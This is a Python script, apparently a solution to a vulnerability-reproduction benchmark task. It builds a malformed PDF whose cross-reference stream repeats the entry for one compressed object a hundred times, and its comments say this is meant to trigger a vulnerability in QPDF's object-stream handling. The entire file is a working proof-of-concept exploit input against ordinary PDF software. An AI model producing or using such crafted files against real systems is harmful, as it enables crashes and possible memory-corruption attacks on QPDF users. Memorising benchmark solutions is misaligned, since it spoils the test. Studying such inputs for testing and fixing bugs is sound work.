import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        
        # 1 0 obj: Catalog
        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # 2 0 obj: Pages
        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # 3 0 obj: Page
        # Reference ID 5 in Annots to ensure it is processed
        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Annots [5 0 R] >>\nendobj\n"
        
        # 4 0 obj: Object Stream containing object 5
        # The stream data maps: "5 0" (obj 5 at offset 0). The object data is "(test)".
        # "5 0 " is 4 bytes. So /First should be 4.
        stm_data = b"5 0 (test)"
        o4 = b"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 >>\nstream\n" + stm_data + b"\nendstream\nendobj\n"
        
        body = header + o1 + o2 + o3 + o4
        
        # Calculate offsets
        off1 = len(header)
        off2 = off1 + len(o1)
        off3 = off2 + len(o2)
        off4 = off3 + len(o3)
        
        # Prepare XRef Stream data (ID 6)
        # We will create multiple entries for ID 5 to trigger the vulnerability
        # in QPDFWriter::preserveObjectStreams / QPDF::getCompressibleObjSet
        dup_count = 100
        
        # /W [1 4 2] -> Type (1 byte), Field2 (4 bytes), Field3 (2 bytes)
        def create_entry(type_, f2, f3):
            return struct.pack('>B', type_) + struct.pack('>I', f2) + struct.pack('>H', f3)
        
        entries = []
        # ID 0: Free
        entries.append(create_entry(0, 0, 65535))
        # ID 1: In use
        entries.append(create_entry(1, off1, 0))
        # ID 2: In use
        entries.append(create_entry(1, off2, 0))
        # ID 3: In use
        entries.append(create_entry(1, off3, 0))
        # ID 4: In use (The ObjStm)
        entries.append(create_entry(1, off4, 0))
        
        # ID 5: Compressed in Stm 4 at index 0
        # Duplicate this entry many times
        for _ in range(dup_count):
            entries.append(create_entry(2, 4, 0))
            
        xref_bytes = b"".join(entries)
        
        # Build /Index array: [0 5, 5 1, 5 1, ...]
        # 0 5 -> defines 0, 1, 2, 3, 4
        # 5 1 -> defines 5
        # 5 1 -> defines 5 (again)
        index_arr = [0, 5]
        for _ in range(dup_count):
            index_arr.extend([5, 1])
            
        index_str = " ".join(map(str, index_arr)).encode('ascii')
        
        # 6 0 obj: XRef Stream
        # Size is 6 (IDs 0-5)
        xobj_dict = (
            b"<< /Type /XRef /Size 6 /Root 1 0 R /W [ 1 4 2 ] /Index [ " + 
            index_str + 
            b" ] /Length " + str(len(xref_bytes)).encode('ascii') + b" >>"
        )
        
        o6 = b"6 0 obj\n" + xobj_dict + b"\nstream\n" + xref_bytes + b"\nendstream\nendobj\n"
        
        # Final PDF assembly
        off6 = len(body)
        pdf = body + o6
        trailer = b"startxref\n%d\n%%%%EOF" % off6
        
        return pdf + trailer